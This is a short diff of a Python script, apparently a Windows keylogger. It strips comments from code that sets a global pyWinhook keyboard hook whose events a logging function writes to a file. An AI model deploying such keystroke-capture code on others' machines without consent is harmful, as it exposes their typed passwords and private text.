@@ -106,11 +106,7 @@ def log(event):
         file.close()
 
 
-# Declaring hook manager
 hm = pyWinhook.HookManager()
-# To block keyboard
 hm.KeyDown = KeyDown
-# Set the hook
 hm.HookKeyboard()
-# Wait forever
 pythoncom.PumpMessages()
